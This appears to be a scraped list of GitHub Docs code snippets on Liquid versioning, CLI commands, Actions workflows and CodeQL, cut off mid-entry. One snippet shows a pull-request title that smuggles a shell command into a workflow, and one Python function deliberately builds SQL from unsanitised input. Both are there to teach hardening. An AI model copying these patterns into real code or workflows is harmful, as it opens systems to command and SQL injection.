https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/refactoring-data-access-layers.md#_snippet_1\n\nLANGUAGE: python\nCODE:\n```\n# database.py\nimport sqlite3\n\nclass Database:\n    def __init__(self, db_path):\n        self.db_path = db_path\n\n    def __enter__(self):\n        self.conn = sqlite3.connect(self.db_path)\n        self.cursor = self.conn.cursor()\n        return self\n\n    def __exit__(self, exc_type, exc_val, exc_tb):\n        if exc_type or exc_val or exc_tb:\n            self.conn.rollback()\n        else:\n            self.conn.commit()\n        self.conn.close()\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering based on FPT or GHES version\nDESCRIPTION: This snippet demonstrates conditional rendering using the `ifversion` tag with a logical OR operator. It checks if either the `fpt` condition is true or the GHES version is less than 2.14. If either condition is met, the 'Bravo' text is rendered.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/less-than-next-oldest.md#_snippet_1\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion fpt or ghes < 2.14 %}\n\nBravo\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Listing Files After Script Injection - Shell\nDESCRIPTION: This shell code demonstrates the output of the vulnerable YAML above when injected with a pull request title of `a\"; ls $GITHUB_WORKSPACE\"`.  The `ls` command is executed on the runner.\nSOURCE: https://github.com/github/docs/blob/main/content/enterprise-onboarding/github-actions-for-your-enterprise/security-hardening-for-github-actions.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nRun title=\"a\"; ls $GITHUB_WORKSPACE\"\"\nREADME.md\ncode.yml\nexample.js\n```\n\n----------------------------------------\n\nTITLE: Fork repository to organization using GitHub CLI\nDESCRIPTION: This command forks a repository and places it within a specified organization using the `--org` flag.  The user must have the necessary permissions to create repositories in the specified organization. It uses the GitHub CLI.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/working-with-forks/fork-a-repo.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh repo fork REPOSITORY --org \"octo-org\"\n```\n\n----------------------------------------\n\nTITLE: Versioning for specific GHES releases using YAML\nDESCRIPTION: This YAML snippet demonstrates versioning a page for Free, Pro, & Team (fpt), GitHub Enterprise Cloud (ghec), and GitHub Enterprise Server (ghes) versions 3.1 and 3.2 only, using '>=' and '<'.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/versioning-documentation.md#_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nversions:\n  fpt: '*'\n  ghec: '*'\n  ghes: '>=3.1 <3.3'\n```\n\n----------------------------------------\n\nTITLE: Migration Succeeded Output\nDESCRIPTION: Example output from the {% data variables.product.prodname_cli %} indicating a successful migration. It displays the migration ID and the state as SUCCEEDED.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise-migration-tool/checking-the-migration-status.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nMigration completed (ID: RM_123)! State: SUCCEEDED\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering of Message in HTML\nDESCRIPTION: This snippet conditionally renders a message based on the platform version (fpt or ghec). It utilizes the {% ifversion %} tag to check the version and display the message accordingly. The message informs users that enabling security and analysis features will trigger read-only analysis on their repository.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/security/security-and-analysis-features-enable-read-only.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n{% ifversion fpt or ghec %}\nIf you enable security and analysis features, {% data variables.product.company_short %} performs read-only analysis on your repository.\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Downloading Artifacts\nDESCRIPTION: This workflow downloads an artifact from a previous workflow run. It uses the `download-artifact` action to retrieve the application binary and then publishes it to {% data variables.product.github %} releases using the `gh` CLI.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-rust.md#_snippet_6\n\nLANGUAGE: YAML\nCODE:\n```\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Download release artifact\n        uses: {% data reusables.actions.action-download-artifact %}\n        with:\n          name: {% raw %}<my-app>{% endraw %}\n          path: ./{% raw %}<my-app>{% endraw %}\n      - name: Publish built binary to {% data variables.product.github %} releases\n      - run: |\n          gh release create --generate-notes ./{% raw %}<my-app>/<my-project>#<my-app>{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: List Codespaces with GitHub CLI\nDESCRIPTION: Lists all codespaces associated with the user account using the GitHub CLI. This command requires the GitHub CLI (`gh`) to be installed and authenticated, either locally or within a codespace. The output includes the permanent name of each codespace.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/codespaces/permanent-codespace-names.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ngh codespace list\n```\n\n----------------------------------------\n\nTITLE: Linking to a Different Version Article - Markdown\nDESCRIPTION: This markdown snippet demonstrates how to link to a different article in a different version of GitHub documentation. It provides a static link format where you manually specify the article title, version, and path.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_19\n\nLANGUAGE: markdown\nCODE:\n```\nFor more information, see [ARTICLE TITLE](/) in the VERSION documentation.\n```\n\n----------------------------------------\n\nTITLE: Adding security-and-quality Query Suite in CodeQL\nDESCRIPTION: This YAML configuration file adds the `security-and-quality` query suite to the list of queries run by CodeQL during code scanning. It specifies the name of the configuration and the query suite to be used.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/code-scanning/example-configuration-files.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nname: \"My {% data variables.product.prodname_codeql %} config\"\n\nqueries:\n  - uses: security-and-quality\n```\n\n----------------------------------------\n\nTITLE: Specifying repository references using different protocols\nDESCRIPTION: These text snippets show different valid syntaxes for specifying a repository reference when configuring content exclusions. Copilot will match the repository regardless of how it was cloned locally, and the `user@` and `:port` parts are ignored when determining which paths to exclude.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/managing-copilot/configuring-and-auditing-content-exclusion/excluding-content-from-github-copilot.md#_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nhttp[s]://host.xz[:port]/path/to/repo.git/\n\ngit://host.xz[:port]/path/to/repo.git/\n\n[user@]host.xz:path/to/repo.git/\n\nssh://[user@]host.xz[:port]/path/to/repo.git/\n```\n\n----------------------------------------\n\nTITLE: Displaying Cluster Configuration Completion Message\nDESCRIPTION: This code snippet shows the message that appears after a successful cluster configuration of {% data variables.product.prodname_ghe_server %}. It confirms that the configuration process has finished. No specific dependencies are required as it's a simple output message.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise_clustering/configuration-finished.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nFinished cluster configuration\n```\n\n----------------------------------------\n\nTITLE: Adding YAML Front Matter to 404 Page\nDESCRIPTION: This YAML snippet is used as front matter for a 404.md file in a Jekyll-based GitHub Pages site. It specifies the permalink for the 404 page, ensuring it is served at /404.html. The front matter must be added to the beginning of the 404.md file.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/getting-started-with-github-pages/creating-a-custom-404-page-for-your-github-pages-site.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\n---\npermalink: /404.html\n---\n```\n\n----------------------------------------\n\nTITLE: Conditional Invitation Management Link\nDESCRIPTION: This snippet conditionally includes a link to edit or cancel an organization invitation based on the GitHub version being either FPT (Free, Pro, Team) or GHEC (GitHub Enterprise Cloud). It checks if the version matches these criteria and displays the link if it does.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/organizations/cancel_org_invite.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n{% ifversion fpt or ghec %}\nYou can [edit or cancel an invitation](/organizations/managing-membership-in-your-organization/canceling-or-editing-an-invitation-to-join-your-organization) any time before the user accepts.\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Embedding image in a numbered list - Markdown\nDESCRIPTION: This snippet demonstrates how to embed an image within a numbered list using Markdown syntax. The image is included as part of the second item in the list. The `![alt text](/path/to/image.png)` syntax is used for image embedding.  The `alt text` should be descriptive and the `path/to/image.png` must be a valid image location.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/images/images-in-lists.md#_snippet_0\n\nLANGUAGE: Markdown\nCODE:\n```\n1. Cold brew is great.\n1. French press is also great\n  ![test image](/assets/images/_fixtures/electrocat.png)\n3. Drip coffee is not so great.\n```\n\n----------------------------------------\n\nTITLE: Executing codeql resolve qlpacks in shell\nDESCRIPTION: This command creates a list of QL packs that can be resolved given the configured search path. The output format can be controlled using the `--format` option. This command is deprecated, and `codeql resolve packs` should be used instead.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/resolve-qlpacks.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql resolve qlpacks <options>...\n```\n\n----------------------------------------\n\nTITLE: Next Build (Test Fix)\nDESCRIPTION: Builds the Next.js application.  This is potentially required before running tests if encountering a 'Could not find a production build' error.  It ensures the necessary production build artifacts are available for testing.\nSOURCE: https://github.com/github/docs/blob/main/src/tests/README.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nnpx next build\n```\n\n----------------------------------------\n\nTITLE: Example YAML frontmatter for includeGuides\nDESCRIPTION: Illustrates the usage of the `includeGuides` frontmatter property, which renders a list of specified articles filterable by type and topics. Applicable when used with `layout: product-guides`.\nSOURCE: https://github.com/github/docs/blob/main/content/README.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nincludeGuides:\n  - /actions/guides/about-continuous-integration\n  - /actions/guides/setting-up-continuous-integration-using-workflow-templates\n  - /actions/guides/building-and-testing-nodejs\n  - /actions/guides/building-and-testing-powershell\n```\n\n----------------------------------------\n\nTITLE: Nested Conditional Content (Liquid)\nDESCRIPTION: This Liquid snippet demonstrates a nested `ifversion` conditional. The outer `ifversion` checks for fpt, ghes, ghae, or ghec. If true, it proceeds to the inner `ifversion`, checking for fpt or ghec. If both are true, \"Bravo\" is rendered.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/unnecessary.md#_snippet_1\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion fpt or ghes or ghae or ghec %}\nAlpha\n  {% ifversion fpt or ghec %}\n  Bravo\n  {% endif %}\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Update Check Run Summary and Text - Ruby\nDESCRIPTION: This Ruby code snippet formats a summary and text output for a GitHub check run, extracting data from the RuboCop report stored in the `@output` variable. It sets the `summary` to include the offense count, file count, and inspected file count, and the `text` to the RuboCop version. These values will be used when updating the check run via the GitHub API.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_38\n\nLANGUAGE: ruby\nCODE:\n```\n        # Updated check run summary and text parameters\n        summary = \"Octo RuboCop summary\\n-Offense count: #{@output['summary']['offense_count']}\\n-File count: #{@output['summary']['target_file_count']}\\n-Target file count: #{@output['summary']['inspected_file_count']}\"\n        text = \"Octo RuboCop version: #{@output['metadata']['rubocop_version']}\"\n```\n\n----------------------------------------\n\nTITLE: Alternative Citation File Names\nDESCRIPTION: These are examples of alternative citation files that {% data variables.product.company_short %} will detect, but not parse into citation formats. These files, located in the root of the repository, should provide citation information.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/managing-your-repositorys-settings-and-features/customizing-your-repository/about-citation-files.md#_snippet_6\n\nLANGUAGE: text\nCODE:\n```\n# Note these are case-insensitive and must be in the root of the repository\nCITATION\nCITATIONS\nCITATION.bib\nCITATIONS.bib\nCITATION.md\nCITATIONS.md\n\n# CITATION files for R packages are typically found at inst/CITATION\ninst/CITATION\n```\n\n----------------------------------------\n\nTITLE: YAML Code Annotation Example\nDESCRIPTION: Shows how to use code sample annotations in YAML code blocks within GitHub Docs. This allows adding comments as annotations next to the code, providing explanations without cluttering the code itself. Requires `layout: inline` frontmatter property.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\n# The name of the workflow as it will appear in the \"Actions\" tab of the GitHub repository.\nname: Post welcome comment\n# The `on` keyword lets you define the events that trigger when the workflow is run.\non:\n  # Add the `pull_request` event, so that the workflow runs automatically\n  # every time a pull request is created.\n  pull_request:\n    types: [opened]\n# Modifies the default permissions granted to `GITHUB_TOKEN`.\npermissions:\n  pull-requests: write\n# Defines a job with the ID `build` that is stored within the `jobs` key.\njobs:\n  build:\n    name: Post welcome comment\n    # Configures the operating system the job runs on.\n    runs-on: ubuntu-latest\n    # The `run` keyword tells the job to execute the [`gh pr comment`](https://cli.github.com/manual/gh_pr_comment) command on the runner.\n    steps:\n      - run: gh pr comment $PR_URL --body \"Welcome to the repository!\"\n        env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          PR_URL: ${{ github.event.pull_request.html_url }}\n```\n\n----------------------------------------\n\nTITLE: Detecting Deployment Blocked by Azure Policy\nDESCRIPTION: This error code indicates that Azure policies are preventing the creation of network interfaces (NICs), which are essential for launching GitHub-hosted runners. This issue arises when policies restrict resource creation based on tags, names, or other criteria.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/azure-vnet-hosted-compute-troubleshooting.md#_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nRunnerDeploymentBlockedByPolicy\n```\n\n----------------------------------------\n\nTITLE: Run Automated Pipeline Data Sync Script - Shell\nDESCRIPTION: This script is used to create placeholder data files for release notes and content from automated pipelines. It should be run from the root of the `github/docs-internal` repository.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/lib/release-templates/release-steps-1.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nsrc/ghes-releases/scripts/sync-automated-pipeline-data.js\n```\n\n----------------------------------------\n\nTITLE: Define domains for managing job data\nDESCRIPTION: These domains are used for uploading and downloading job summaries, logs, workflow artifacts, and caches. Facilitates data persistence and retrieval during workflow execution.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/runner-essential-communications.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nresults-receiver.actions.githubusercontent.com\n*.blob.core.windows.net\n```\n\n----------------------------------------\n\nTITLE: Tool Tag: Desktop\nDESCRIPTION: This code snippet demonstrates how to use the `desktop` tag to display content relevant to GitHub Desktop users. It wraps instructions specific to using GitHub Desktop.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_14\n\nLANGUAGE: text\nCODE:\n```\n{% raw %}{% desktop %}\n\n These instructions are pertinent to GitHub Desktop.\n\n{% enddesktop %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Tracking Experiment Results with Regular Events\nDESCRIPTION: This TypeScript code demonstrates how to track experiment results using regular events. If the `includeVariationInContext` key is set to `true` for an experiment, the `experiment_variation` will be included in the context of the event. Requires the `EventType` enum and `sendEvent` function.\nSOURCE: https://github.com/github/docs/blob/main/src/events/components/experiments/README.md#_snippet_3\n\nLANGUAGE: typescript\nCODE:\n```\nsendEvent({\n  type: EventType.search,\n  search_query: \"How do I open pdf?\",\n  search_context: \"general-search\",\n});\n```\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  search_query: \"How do I open pdf?\",\n  search_context: \"general-search\",\n  context: {\n    ...\n    experiment_variation: \"treatment\" // Could also be \"control\" depending on the random outcome\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Scheduling a Pipeline with Cron in Jenkins\nDESCRIPTION: This code snippet demonstrates how to schedule a Jenkins pipeline to run using cron syntax. The `cron` trigger is defined within the `triggers` block, specifying the schedule for the pipeline execution. The `agent any` specifies that the pipeline can run on any available agent.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-jenkins-to-github-actions.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\npipeline {\n  agent any\n  triggers {\n    cron('H/15 * * * 1-5')\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Conditional Table Row Inclusion with Version Check\nDESCRIPTION: This snippet shows conditionally including a complete table row. The row displaying info about Cargo and Rust languages is embedded within an `ifversion` block. Note the different spacing used here.\nSOURCE: https://github.com/github/docs/blob/main/src/content-linter/tests/fixtures/tables.md#_snippet_4\n\nLANGUAGE: Markdown\nCODE:\n```\n| Package manager | Languages | Recommended formats | All supported formats |\n| --- | --- | --- | ---|{% ifversion volvo %}\n| Cargo | Rust | `Cargo.lock` | `Cargo.toml`, `Cargo.lock` |{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Example: Overwriting Job Summary Content in Bash\nDESCRIPTION: This YAML configuration demonstrates how to overwrite the contents of the job summary. The `>` operator is used to overwrite any existing content with new content.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_48\n\nLANGUAGE: yaml\nCODE:\n```\n- name: Overwrite Markdown\n  run: |\n    echo \"Adding some Markdown content\" >> $GITHUB_STEP_SUMMARY\n    echo \"There was an error, we need to clear the previous Markdown with some new content.\" > $GITHUB_STEP_SUMMARY\n\n```\n\n----------------------------------------\n\nTITLE: Restart server command - Shell\nDESCRIPTION: This is a shell command to restart the ruby server. It uses the ruby interpreter to execute the 'server.rb' file. Before running, the existing server can be stopped using Ctrl+C in the terminal where it's running.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_23\n\nLANGUAGE: shell\nCODE:\n```\nruby server.rb\n```\n\n----------------------------------------\n\nTITLE: Setting execute permissions for pre-receive hook (always_reject.sh)\nDESCRIPTION: This command sets execute permissions for the `always_reject.sh` pre-receive hook script. This is a crucial step to ensure the script can be executed by Git during the push process.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/enforcing-policies/enforcing-policy-with-pre-receive-hooks/creating-a-pre-receive-hook-script.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\nchmod +x always_reject.sh\n```\n\n----------------------------------------\n\nTITLE: Resolving RAM options for CodeQL CLI\nDESCRIPTION: Prepares command-line options for starting a CodeQL query evaluator. It determines appropriate `-J-Xmx` and `--off-heap-ram` options based on a desired total RAM amount.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/resolve-ram.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql resolve ram [--ram=<MB>] <options>...\n```\n\n----------------------------------------\n\nTITLE: Conditional Version Check with Whitespace Control\nDESCRIPTION: This snippet uses the `ifversion` tag to conditionally render content based on the GitHub Enterprise Server (GHES) version. The whitespace trim characters (`-`) are used to remove leading or trailing whitespace around the tag.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/whitespace.md#_snippet_0\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes > 2.13 %}\n  Alpha\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Retrieving User Data (Vulnerable)\nDESCRIPTION: This Python code retrieves a user record from a SQLite database using a hardcoded SQL query, making it vulnerable to SQL injection. It also lacks proper error handling and doesn't abstract the database connection logic.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/refactoring-data-access-layers.md#_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nimport sqlite3\n\ndef get_user_by_id(user_id):\n    conn = sqlite3.connect('database.db')\n    cursor = conn.cursor()\n    cursor.execute(f\"SELECT display_name FROM users WHERE id = {user_id}\")\n    user = cursor.fetchone()\n    conn.close()\n    return user\n```\n\n----------------------------------------\n\nTITLE: GitHub Connection and Job Listening in Shell\nDESCRIPTION: This shell snippet shows a successful connection to GitHub, followed by the start of listening for jobs. It confirms that the system is ready to receive and process tasks from GitHub.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/self-hosted-runner-connected-output.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n√ Connected to GitHub\n\n2019-10-24 05:45:56Z: Listening for Jobs\n```\n\n----------------------------------------\n\nTITLE: Example Ruby Code with Redcarpet\nDESCRIPTION: This Ruby code snippet demonstrates a simple usage of the `redcarpet` gem for Markdown parsing. It initializes a Redcarpet object with a string \"Hello World!\" and then converts it to HTML using the `to_html` method, printing the result to standard output.  Ensure the redcarpet gem is installed before running.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/working-with-advanced-formatting/creating-and-highlighting-code-blocks.md#_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nrequire 'redcarpet'\nmarkdown = Redcarpet.new(\"Hello World!\")\nputs markdown.to_html\n```\n\n----------------------------------------\n\nTITLE: Unsetting GPG Signing Format in Git (Shell)\nDESCRIPTION: This snippet unsets the `gpg.format` configuration in Git, which specifies the key format used when signing commits with `--gpg-sign`. Unsetting this configuration reverts Git to using the default `openpgp` format. This command removes the custom `gpg.format` setting from the global Git configuration.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gpg/configure-gpg-signing.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngit config --global --unset gpg.format\n```\n\n----------------------------------------\n\nTITLE: Path Qualifier with Glob Expression\nDESCRIPTION: This snippet demonstrates using a glob expression within the `path:` qualifier.  It searches for files with the extension `.txt`.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_15\n\nLANGUAGE: text\nCODE:\n```\npath:*.txt\n```\n\n----------------------------------------\n\nTITLE: Formatting content within a table\nDESCRIPTION: This snippet demonstrates how to use formatting such as links, inline code blocks, and text styling within a Markdown table.  It showcases the use of backticks for inline code, asterisks for italics, and double asterisks for bold text.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/working-with-advanced-formatting/organizing-information-with-tables.md#_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n| Command | Description |\n| --- | --- |\n| `git status` | List all *new or modified* files |\n| `git diff` | Show file differences that **haven't been** staged |\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering with GHES and FPT/GHES>2.13 using Liquid\nDESCRIPTION: This snippet demonstrates conditional rendering based on GHES version being 2.13 and FPT product or GHES greater than 2.13. If the GHES version is 2.13, \"Alpha\" is rendered. Otherwise, \"Charlie\" is rendered, followed by \"Bravo\" only if the product is FPT or if the GHES version is greater than 2.13.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/equals.md#_snippet_5\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes = 2.13 %}\n\nAlpha\n\n{% else %}\n\nCharlie\n\n{% ifversion fpt or ghes > 2.13 %}\n\nBravo\n\n{% endif %}\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Creating an STL 3D model\nDESCRIPTION: This code snippet demonstrates how to create a simple 3D model using ASCII STL syntax.  It defines a solid called 'cube_corner' and specifies the facets, normals, and vertices to create a basic shape. The 3D model is rendered based on this STL definition.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/working-with-advanced-formatting/creating-diagrams.md#_snippet_4\n\nLANGUAGE: STL\nCODE:\n```\nsolid cube_corner\n  facet normal 0.0 -1.0 0.0\n    outer loop\n      vertex 0.0 0.0 0.0\n      vertex 1.0 0.0 0.0\n      vertex 0.0 0.0 1.0\n    endloop\n  endfacet\n  facet normal 0.0 0.0 -1.0\n    outer loop\n      vertex 0.0 0.0 0.0\n      vertex 0.0 1.0 0.0\n      vertex 1.0 0.0 0.0\n    endloop\n  endfacet\n  facet normal -1.0 0.0 0.0\n    outer loop\n      vertex 0.0 0.0 0.0\n      vertex 0.0 0.0 1.0\n      vertex 0.0 1.0 0.0\n    endloop\n  endfacet\n  facet normal 0.577 0.577 0.577\n    outer loop\n      vertex 1.0 0.0 0.0\n      vertex 0.0 1.0 0.0\n      vertex 0.0 0.0 1.0\n    endloop\n  endfacet\nendsolid\n```\n\n----------------------------------------\n\nTITLE: Restarting the Server - Shell\nDESCRIPTION: This shell command restarts the Ruby server. First, it stops the server (if it's running) by sending a Ctrl-C signal, and then it starts the server again using `ruby server.rb`. The server.rb file is assumed to be in the current directory.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_28\n\nLANGUAGE: Shell\nCODE:\n```\nruby server.rb\n```\n\n----------------------------------------\n\nTITLE: Conditional Preview Button Text\nDESCRIPTION: This snippet uses a conditional statement to display different text and image paths depending on the `code-view-ui` version. If `code-view-ui` is enabled, it displays 'Preview', otherwise it displays 'Preview changes'. The corresponding screenshot path is also updated.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/files/preview_change.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n{% ifversion code-view-ui %}\n1. Above the new content, click **Preview**.\n\n   ![Screenshot of a file in edit mode. Above the file's contents, a tab labeled \"Preview\" is outlined in dark orange.](/assets/images/help/repository/edit-readme-preview-changes.png)\n{% else %}\n1. Above the new content, click **Preview changes**.\n   ![Screenshot of a file in edit mode. Above the file's contents, a tab labeled \"Preview changes\" is outlined in dark orange.](/assets/images/enterprise/repository/edit-readme-preview-changes.png)\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Require Git Gem\nDESCRIPTION: This snippet imports the `git` gem, allowing the Ruby application to perform Git operations like cloning repositories.  This gem is assumed to be installed via `bundle install` from a `Gemfile`.  It's added at the top of the `server.rb` file, below other `require` statements.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_30\n\nLANGUAGE: ruby\nCODE:\n```\nrequire 'git'\n```\n\n----------------------------------------\n\nTITLE: CodeQL CLI Configuration File\nDESCRIPTION: This JSON configuration file specifies metadata about the CodeQL CLI pipeline.  It defines the `defaultFrontmatter` property, which sets the initial frontmatter for newly created Markdown files. The file is used by the entrypoint script `sync.js`.\nSOURCE: https://github.com/github/docs/blob/main/src/codeql-cli/README.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\nsrc/codeql-cli/lib/config.json\n```\n\n----------------------------------------\n\nTITLE: Handling Application Suspended Error\nDESCRIPTION: This code snippet shows the URL parameters returned to the callback URL when an OAuth application has been suspended by GitHub. It includes the error code, a description of the issue, a URI pointing to documentation, and the state parameter.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/maintaining-oauth-apps/troubleshooting-authorization-request-errors.md#_snippet_0\n\nLANGUAGE: HTTP\nCODE:\n```\nhttp://your-application.com/callback?error=application_suspended\n  &error_description=Your+application+has+been+suspended.+Contact+support@github.com.\n  &error_uri=/apps/building-integrations/setting-up-and-registering-oauth-apps/troubleshooting-authorization-request-errors/%23application-suspended\n  &state=xyz\n```\n\n----------------------------------------\n\nTITLE: Fetching Pull Request Line Comments with Octokit.rb\nDESCRIPTION: This snippet retrieves comments made on specific lines within a Pull Request's diff view using Octokit.rb. It employs the `pull_request_comments` method, requiring the repository name and Pull Request ID. The code iterates through the comments, extracting username, post date, comment content, file path, and line position.  Octokit.rb and a personal access token (PAT) from the `MY_PERSONAL_TOKEN` environment variable are prerequisites.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/working-with-comments.md#_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\nrequire 'octokit'\n\n# !!! DO NOT EVER USE HARD-CODED VALUES IN A REAL APP !!!\n# Instead, set and test environment variables, like below\nclient = Octokit::Client.new :access_token => ENV['MY_PERSONAL_TOKEN']\n\nclient.pull_request_comments(\"octocat/Spoon-Knife\", 1176).each do |comment|\n  username = comment[:user][:login]\n  post_date = comment[:created_at]\n  content = comment[:body]\n  path = comment[:path]\n  position = comment[:position]\n\n  puts \"#{username} made a comment on #{post_date} for the file called #{path}, on line #{position}. It says:\\n'#{content}'\\n\"\nend\n```\n\n----------------------------------------\n\nTITLE: Retrieving Webhook Logs (ghe-webhook-logs)\nDESCRIPTION: This utility returns webhook delivery logs for administrators. It can be filtered by event, action, date, and delivery GUID.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_32\n\nLANGUAGE: Shell\nCODE:\n```\nghe-webhook-logs\n```\n\nLANGUAGE: Shell\nCODE:\n```\nghe-webhook-logs --event issues\n```\n\nLANGUAGE: Shell\nCODE:\n```\nghe-webhook-logs --event issues.opened\n```\n\nLANGUAGE: Shell\nCODE:\n```\nghe-webhook-logs -f -a YYYY-MM-DD\n```\n\nLANGUAGE: Shell\nCODE:\n```\nghe-webhook-logs -g DELIVERY_GUID\n```\n\n----------------------------------------\n\nTITLE: Define domains for Large File Storage (LFS)\nDESCRIPTION: These domains are required for using GitHub's Large File Storage (LFS) feature. Enables efficient management of large files within repositories.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/runner-essential-communications.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\ngithub-cloud.githubusercontent.com\ngithub-cloud.s3.amazonaws.com\n```\n\n----------------------------------------\n\nTITLE: Defining macOS Runner Labels - GitHub Actions\nDESCRIPTION: These code snippets represent workflow labels used to specify the macOS runner environment in GitHub Actions. The labels allow users to select specific macOS versions for their jobs, such as 'macos-13', 'macos-latest', 'macos-14', and 'macos-15'. These labels are used in the workflow configuration file to determine the virtual machine environment for running the job.\nSOURCE: 